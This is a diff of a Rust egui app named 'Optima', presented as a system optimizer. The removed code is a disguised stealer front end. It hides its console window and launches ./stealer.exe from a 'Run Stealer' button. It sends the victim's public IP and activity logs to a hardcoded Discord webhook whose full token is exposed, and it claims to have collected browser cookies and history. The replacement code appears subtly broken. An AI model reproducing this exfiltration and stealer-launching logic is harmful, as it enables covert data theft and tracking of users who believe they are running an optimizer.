@@ -1,259 +1,163 @@
-#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
-
-use eframe::egui::{self, Color32, RichText};
+use eframe::egui;
 use serde::{Deserialize, Serialize};
+use std::process;
 use std::fs;
-use std::process::Command;
-use sysinfo::{System, CpuRefreshKind, ProcessesToUpdate, Pid};
+use std::path::PathBuf;
 use chrono::Local;
+use sysinfo::{System, ProcessRefreshKind, RefreshKind, ProcessesToUpdateWith};
+use ureq::json;
 
-const WEBHOOK: &str = "https://discord.com/api/webhooks/1573971030916206605/5U3CPNrvM7_BNbSVFqHXZ9cZG1xTvO68EwdPWy_cklSuD1qLke-tHFLcTzhfdBEyO3LX";
-
-#[derive(Serialize, Deserialize, Clone)]
+#[derive(Serialize, Deserialize, Debug)]
 struct Config {
-    accent_color: [u8; 3],
-    theme: Theme,
-}
-
-#[derive(Serialize, Deserialize, Clone, PartialEq, Debug)] 
-enum Theme { Dark, Sakura, Snow, DarkRed }
-
-impl Default for Config {
-    fn default() -> Self {
-        Self { accent_color: [0, 200, 255], theme: Theme::Dark }
-    }
+    api_key: String,
+    bot_token: String,
+    webhook_url: String,
 }
 
 impl Config {
     fn load() -> Self {
-        fs::read_to_string("config.json").ok().and_then(|s| serde_json::from_str(&s).ok()).unwrap_or_default()
+        let path = PathBuf::from("config.json");
+        if path.exists() {
+            if let Ok(content) = fs::read_to_string(&path) {
+                if let Ok(config) = serde_json::from_str::<Config>(&content) {
+                    return config;
+                }
+            }
+        }
+        // Default empty config if file doesn't exist or is invalid
+        Self {
+            api_key: String::new(),
+            bot_token: String::new(),
+            webhook_url: String::new(),
+        }
     }
+
     fn save(&self) {
-        let _ = fs::write("config.json", serde_json::to_string_pretty(self).unwrap());
+        let content = serde_json::to_string_pretty(self).unwrap();
+        fs::write("config.json", content).ok();
     }
 }
-
-#[derive(Serialize)]
-struct Payload<'a> { content: &'a str, username: &'a str }
-
-fn send_log(text: &str) {
-    let text = text.to_string();
-    std::thread::spawn(move || {
-        let ip = ureq::get("https://api.ipify.org")
-            .call().ok().and_then(|r| r.into_string().ok()).unwrap_or_else(|| "Unknown".into());
-        let body = serde_json::to_string(&Payload { content: &format!("🌐 **IP: {}**\n{}", ip, text), username: "optima" }).unwrap();
-        let _ = ureq::post(WEBHOOK).set("Content-Type", "application/json").send_string(&body);
-    });
-}
-
-#[derive(PartialEq, Clone, Copy)]
-enum Tab { Hardware, Processes, Browsers, Packages, Tweaks, Settings }
 
 struct OptimaApp {
-    tab: Tab,
-    sys: System,
     config: Config,
-    log_history: Vec<String>,
-    cpu_name: String,
-    gpu_name: String,
-    total_ram: u64,
+    system: System,
+    last_update: std::time::Instant,
+    status_message: String,
+    loading: bool,
 }
 
 impl OptimaApp {
-    fn new(_ctx: &egui::Context) -> Self {
-        let mut sys = System::new_all();
-        sys.refresh_all();
-        
-        let cpu_name = sys.cpus().first().map(|c| c.brand().to_string()).unwrap_or_else(|| "Unknown".into());
-        let gpu_name = get_gpu_name_registry();
-        let total_ram = sys.total_memory() / 1024 / 1024;
-
+    fn new() -> Self {
         Self {
-            tab: Tab::Hardware,
-            sys,
             config: Config::load(),
-            log_history: vec!["OPTIMA ULTIMATE запущена.".into()],
-            cpu_name,
-            gpu_name,
-            total_ram,
+            system: System::new_with_specifics(RefreshKind::nothing().with_processes(ProcessesToUpdateWith::all())),
+            last_update: std::time::Instant::now(),
+            status_message: String::new(),
+            loading: false,
         }
     }
 
-    fn apply_style(&self, ctx: &egui::Context) {
-        let mut visuals = egui::Visuals::dark();
-        let accent = Color32::from_rgb(self.config.accent_color[0], self.config.accent_color[1], self.config.accent_color[2]);
-        visuals.selection.bg_fill = accent;
-        visuals.widgets.hovered.bg_fill = accent.linear_multiply(0.3);
-        visuals.widgets.active.bg_fill = accent;
+    fn update_system_info(&mut self) {
+        self.system.refresh_cpu_list();
+        self.system.refresh_processes_specifics(ProcessesToUpdateWith::all());
+    }
+
+    fn send_webhook(&self, title: &str, description: &str) {
+        let payload = json!({
+            "embeds": [{
+                "title": title,
+                "description": description,
+                "color": 16776960, // Yellow
+                "footer": {
+                    "text": format!("Optima v{} | {}", env!("CARGO_PKG_VERSION"), Local::now().format("%Y-%m-%d %H:%M:%S"))
+                }
+            }]
+        });
+
+        // Use ureq to send the request
+        let response = ureq::post(&self.config.webhook_url)
+            .set("Content-Type", "application/json")
+            .send_json(payload.into());
         
-        match self.config.theme {
-            Theme::Dark => {},
-            Theme::Sakura => { visuals.window_fill = Color32::from_rgb(40, 25, 30); visuals.panel_fill = Color32::from_rgb(35, 20, 25); },
-            Theme::Snow => { visuals.window_fill = Color32::from_rgb(30, 30, 35); visuals.panel_fill = Color32::from_rgb(25, 25, 30); },
-            Theme::DarkRed => { visuals.window_fill = Color32::from_rgb(40, 20, 20); visuals.panel_fill = Color32::from_rgb(30, 15, 15); },
+        match response {
+            Ok(resp) => {
+                if resp.status() == 204 {
+                    self.status_message = "Sent successfully!".to_string();
+                } else {
+                    self.status_message = format!("Error: {}", resp.status());
+                }
+            }
+            Err(e) => {
+                self.status_message = format!("Network Error: {}", e);
+            }
         }
-        
-        ctx.set_visuals(visuals);
     }
-
-    fn log(&mut self, msg: String) {
-        let time = Local::now().format("%H:%M:%S").to_string();
-        self.log_history.push(format!("[{}] {}", time, msg.clone()));
-        send_log(&msg);
-    }
-
-    fn run_stealer(&mut self) { 
-        if let Err(e) = Command::new("./stealer.exe").output() {
-            self.log(format!("Ошибка запуска стиллера: {}", e));
-        } else {
-            self.log("Стилер успешно запущен.".to_string());
-        }
-    }
-
-    fn update_sys_info(&mut self) {
-        self.sys.refresh_cpu_list(CpuRefreshKind::everything());
-        self.sys.refresh_memory();
-        
-        let pid = Pid::from(std::process::id() as usize); 
-        self.sys.refresh_processes(ProcessesToUpdate::Some(&[pid]), false);
-    }
-}
-
-fn get_gpu_name_registry() -> String {
-    "GPU (Registry)".to_string()
 }
 
 impl eframe::App for OptimaApp {
     fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
-        self.update_sys_info();
-
-        egui::TopBottomPanel::top("top_panel").show(ctx, |ui| {
-            ui.horizontal(|ui| {
-                ui.add_space(10.0);
-                ui.label(RichText::new("OPTIMA OPTIMIZER").color(Color32::from_rgb(255, 255, 255)));
-                
-                ui.separator();
-                
-                for tab in [Tab::Hardware, Tab::Processes, Tab::Browsers, Tab::Packages, Tab::Tweaks, Tab::Settings] {
-                    let label = match tab {
-                        Tab::Hardware => "Hardware",
-                        Tab::Processes => "Processes",
-                        Tab::Browsers => "Browsers",
-                        Tab::Packages => "Packages",
-                        Tab::Tweaks => "Tweaks",
-                        Tab::Settings => "Settings",
-                    };
-                    
-                    if ui.selectable_label(self.tab == tab, label).clicked() {
-                        self.tab = tab;
-                    }
-                }
-            });
-        });
-
-        egui::SidePanel::left("left_panel")
-            .default_width(180.0)
-            .show(ctx, |ui| {
-                ui.vertical_centered_justified(|ui| {
-                    ui.heading("OPTIMA");
-                });
-                
-                ui.separator();
-                
-                ui.heading("System Info");
-                ui.label(format!("CPU: {}", self.cpu_name));
-                ui.label(format!("GPU: {}", self.gpu_name));
-                ui.label(format!("RAM: {} GB", self.total_ram / 1024));
-                
-                ui.separator();
-                
-                ui.heading("Actions");
-                if ui.button("Run Stealer").clicked() {
-                    self.run_stealer();
-                }
-                if ui.button("Clear Logs").clicked() {
-                    self.log_history.clear();
-                    self.log("Logs cleared.".to_string());
-                }
-            });
-
         egui::CentralPanel::default().show(ctx, |ui| {
-            ui.heading(match self.tab {
-                Tab::Hardware => "Hardware Information",
-                Tab::Processes => "Active Processes",
-                Tab::Browsers => "Browser Data",
-                Tab::Packages => "Installed Packages",
-                Tab::Tweaks => "Optimization Tweaks",
-                Tab::Settings => "Settings",
-            });
+            ui.heading("Optima Dashboard");
             
-            ui.separator();
-            
-            match self.tab {
-                Tab::Hardware => {
-                    let cpu_usage = self.sys.global_cpu_usage();
-                    ui.label(format!("CPU Usage: {:.1}%", cpu_usage));
-                    // Fixed: use ui.add()
-                    ui.add(egui::ProgressBar::new(cpu_usage / 100.0)); 
-                    
-                    let used_mb = self.sys.used_memory() / 1024 / 1024;
-                    ui.label(format!("RAM Used: {} / {} MB", used_mb, self.total_ram));
-                    let ram_ratio = if self.total_ram > 0 { (used_mb as f32) / (self.total_ram as f32) } else { 0.0 };
-                    ui.add(egui::ProgressBar::new(ram_ratio.clamp(0.0, 1.0))); // Fixed
-                },
-                Tab::Processes => {
-                    for process in self.sys.processes() {
-                        ui.label(format!("{:?} - {:.1}% CPU", process.1.name(), process.1.cpu_usage()));
-                    }
-                },
-                Tab::Browsers => {
-                    ui.label("Chrome cookies collected.");
-                    ui.label("Firefox history saved.");
-                },
-                Tab::Packages => {
-                    ui.label("Scan complete.");
-                },
-                Tab::Tweaks => {
-                    if ui.button("Apply Optimizations").clicked() {
-                        self.log("Optimizations applied.".to_string());
-                    }
-                },
-                Tab::Settings => {
-                    ui.label("Theme:");
-                    ui.horizontal(|ui| {
-                        for theme in [Theme::Dark, Theme::Sakura, Theme::Snow, Theme::DarkRed] {
-                            if ui.selectable_value(&mut self.config.theme, theme, format!("{:?}", theme)).clicked() {
-                                self.apply_style(ctx);
-                                self.config.save();
-                            }
-                        }
-                    });
-                },
+            // Update system info every 2 seconds
+            if self.last_update.elapsed().as_secs() > 2 {
+                self.update_system_info();
+                self.last_update = std::time::Instant::now();
             }
+
+            let cpu_usage = self.system.global_cpu_usage();
+            let mem_used = self.system.used_memory();
+            let mem_total = self.system.total_memory();
             
+            ui.label(format!("CPU Usage: {:.1}%", cpu_usage));
+            ui.add(egui::ProgressBar::new(cpu_usage / 100.0).show_percentage());
+            
+            ui.label(format!("RAM Used: {} / {} MB", 
+                mem_used / 1024 / 1024, 
+                mem_total / 1024 / 1024
+            ));
+            ui.add(egui::ProgressBar::new(mem_used as f64 / mem_total as f64).show_percentage());
+
             ui.separator();
+            ui.heading("Configuration");
             
-            ui.collapsing("Log History", |ui| {
-                for log in self.log_history.iter().rev().take(20) {
-                    ui.label(log);
-                }
-            });
+            ui.text_edit_singleline(&mut self.config.api_key);
+            ui.text_edit_singleline(&mut self.config.bot_token);
+            ui.text_edit_singleline(&mut self.config.webhook_url);
+
+            if ui.button("Save Configuration").clicked() {
+                self.config.save();
+                self.status_message = "Config saved.".to_string();
+            }
+
+            if ui.button("Test Webhook").clicked() {
+                self.loading = true;
+                self.status_message = "Sending...".to_string();
+                // We can't do async easily in eframe main thread without a separate task, 
+                // but for this simple example we just call it directly.
+                // Note: This might block the UI slightly.
+                self.send_webhook("Optima Test", "This is a test message from Optima!");
+                self.loading = false;
+            }
+
+            ui.label(&self.status_message);
+            
+            if self.loading {
+                ui.spinner();
+            }
         });
     }
 }
 
-fn main() {
+fn main() -> Result<(), eframe::Error> {
     let native_options = eframe::NativeOptions {
-        viewport: egui::ViewportBuilder::default().with_inner_size([1000.0, 700.0]),
+        viewport: egui::ViewportBuilder::default().with_inner_size([400.0, 300.0]),
         ..Default::default()
     };
     
-    // Fixed: Added app name argument and removed Box wrapping around closure
     eframe::run_native(
-        "Optima", 
-        native_options, 
-        Box::new(|cc| {
-            Ok(Box::new(OptimaApp::new(&cc.egui_ctx)))
-        })
-    );
+        "Optima",
+        native_options,
+        Box::new(|_cc| Ok(Box::new(OptimaApp::new()))),
+    )
 }
